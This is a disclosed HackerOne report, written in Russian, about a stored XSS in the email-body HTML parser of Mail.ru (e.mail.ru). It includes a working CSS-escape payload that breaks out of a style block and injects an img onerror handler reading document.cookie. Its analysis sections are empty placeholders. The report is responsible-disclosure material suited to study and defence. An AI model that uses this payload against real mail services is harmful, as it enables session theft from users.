---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '277163'
original_report_id: '277163'
title: XSS в теле письма, в блочных стилях.
weakness: Cross-site Scripting (XSS) - Stored
team_handle: mailru
created_at: '2017-10-14T09:39:28.333Z'
disclosed_at: '2018-01-26T14:18:40.547Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: e.mail.ru
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS в теле письма, в блочных стилях.

## Metadata

- HackerOne Report ID: 277163
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: mailru
- Disclosed At: 2018-01-26T14:18:40.547Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Здравствуйте!
Бага в тестируемом HTML парсере. В блочных стилях <style></style>

Рабочий код:

<style>
\#test{
background-image:url('//\27\29\3Bcw:;a:\')\3b\3C/style/\20;a:\28\27\27');
background-image:url('//\27\29\3Bcw:;a:\')\3b>;a:\28\27\27');
}
\#p{
background-image:url('//\27\29\3Bcw:;a:\')\3b<img/src=\'dfdfd\'//onerror=\'alert(document.cookie)\'>;a:\28\27\27');
}
</style></style>

В аттаче txt файл с вектором.

С уважением, Максим.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
